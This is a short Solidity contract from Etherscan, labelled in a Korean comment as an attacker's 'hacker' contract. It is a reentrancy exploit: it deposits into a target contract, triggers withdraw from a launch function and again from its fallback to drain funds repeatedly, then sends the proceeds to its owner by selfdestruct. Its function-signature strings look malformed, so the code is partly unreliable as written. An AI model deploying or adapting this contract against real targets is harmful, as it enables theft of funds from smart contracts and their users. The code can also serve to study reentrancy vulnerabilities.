/**
 *Submitted for verification at Etherscan.io on 2021-02-02
*/

// 공격자의 hacker 컨트랙트

pragma solidity ^0.4.25;


contract test {
    

    address owner;
    address target;
    address tokenContract;
    
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    constructor(address _target) public {
        owner = msg.sender;
        target = _target;
    }
    
    function callAddToBalance() public payable {
        target.call
           .value(msg.value)(bytes4(keccak256("deposit()")));
    }
    
    function launch_attack(uint256 wad) public {
       target.call(bytes4(keccak256("withdraw(uint256 wad)")));
    }
    function () public payable {
        target.call(bytes4(keccak256("withdraw(uint256 wad)")));
    }
    
    function getMoney() public onlyOwner {
        selfdestruct(owner);
    }
    
    mapping (address => uint) private userBalances;

    
}